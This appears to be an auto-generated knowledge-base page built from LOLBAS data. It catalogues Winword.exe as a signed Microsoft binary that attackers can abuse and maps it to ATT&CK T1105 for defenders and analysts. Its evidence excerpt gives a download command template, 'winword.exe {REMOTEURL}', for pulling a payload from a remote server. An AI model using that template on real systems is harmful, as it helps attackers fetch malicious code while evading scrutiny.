---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Winword.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `winword.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Winword.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Microsoft Office binary

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/winword.md)
- Source verification: [source record](../../sources/lolbas/winword.exe.md)

## Aliases

- `Winword.exe`
- `winword.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: winword.exe {REMOTEURL} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/winword.exe.md)

## Source Verification

[source record](../../sources/lolbas/winword.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@reegun21'
Person: Reegun J (OCBC Bank)
Author: Reegun J (OCBC Bank)
Commands:
- Category: Download
Command: winword.exe {REMOTEURL}
Description: Downloads payload from remote server
```
